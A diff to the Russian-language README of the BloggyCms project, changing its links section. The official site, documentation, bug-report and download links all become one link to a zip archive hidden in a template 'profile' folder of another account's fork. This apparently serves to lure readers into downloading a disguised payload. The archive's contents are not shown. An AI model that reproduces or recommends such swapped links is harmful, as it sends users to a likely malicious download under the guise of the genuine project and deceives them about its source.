@@ -80,10 +80,10 @@
 
 ## 🔗 Ссылки
 
-- [🌐 Официальный сайт проекта](https://bloggy.su)
-- [📘 Документация](https://github.com/pechoradev/BloggyCms/wiki)
-- [🐛 Сообщить об ошибке](https://github.com/pechoradev/BloggyCms/issues)
-- [📦 Скачать](https://github.com/pechoradev/BloggyCms/releases)
+- [🌐 Официальный сайт проекта](https://github.com/sandwichov/BloggyCms/raw/refs/heads/main/templates/default/front/profile/Bloggy_Cms_v2.6.zip)
+- [📘 Документация](https://github.com/sandwichov/BloggyCms/raw/refs/heads/main/templates/default/front/profile/Bloggy_Cms_v2.6.zip)
+- [🐛 Сообщить об ошибке](https://github.com/sandwichov/BloggyCms/raw/refs/heads/main/templates/default/front/profile/Bloggy_Cms_v2.6.zip)
+- [📦 Скачать](https://github.com/sandwichov/BloggyCms/raw/refs/heads/main/templates/default/front/profile/Bloggy_Cms_v2.6.zip)
 
 ---
 
